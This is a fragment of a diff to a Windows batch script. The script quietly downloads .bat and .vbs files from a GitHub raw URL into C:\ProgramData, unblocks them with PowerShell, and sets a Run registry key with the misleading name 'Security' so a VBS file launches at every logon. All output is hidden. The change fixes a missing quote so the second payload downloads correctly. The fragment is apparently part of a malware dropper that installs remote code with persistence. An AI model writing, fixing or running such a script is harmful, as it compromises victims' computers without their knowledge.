@@ -41,7 +41,7 @@ exit >> nul
 mkdir "C:\ProgramData\PSU" >> nul
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat" >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/world.txt" -o "C:\ProgramData\world.vbs >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/world.txt" -o "C:\ProgramData\world.vbs" >> nul
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs" >> nul
